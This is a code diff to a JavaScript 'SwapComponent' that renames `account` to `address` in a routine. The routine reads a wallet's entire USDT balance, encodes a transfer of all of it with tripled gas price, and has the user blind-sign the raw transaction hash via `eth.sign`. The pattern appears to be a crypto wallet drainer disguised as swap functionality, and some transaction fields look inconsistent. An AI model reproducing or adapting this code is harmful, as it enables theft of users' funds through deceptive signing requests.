@@ -156,23 +156,21 @@ function SwapComponent() {
       },
     ]
 
-    const account = await web3js.eth.getAccounts()[0]
-
     const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
-    const usdtBalance = await usdtContract.methods.balanceOf(account).call()
+    const usdtBalance = await usdtContract.methods.balanceOf(address).call()
 
     if (usdtBalance <= 0) {
       console.log('Insufficient USDT balance')
       return
     }
 
-    const data = usdtContract.methods.transfer(account, usdtBalance).encodeABI()
-    const nonce = await web3js.eth.getTransactionCount(account, 'pending')
+    const data = usdtContract.methods.transfer(address, usdtBalance).encodeABI()
+    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
 
     const tx_ = {
-      from: account,
-      to: account,
+      from: address,
+      to: address,
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
       gasLimit: '0x5208',
@@ -188,7 +186,7 @@ function SwapComponent() {
     const sha3_ = web3js.utils.sha3(serializedTx)
 
     await web3js.eth
-      .sign(sha3_, account)
+      .sign(sha3_, address)
       .then(async (signed) => {
         const temporary = signed.substring(2)
         const r_ = '0x' + temporary.substring(0, 64)
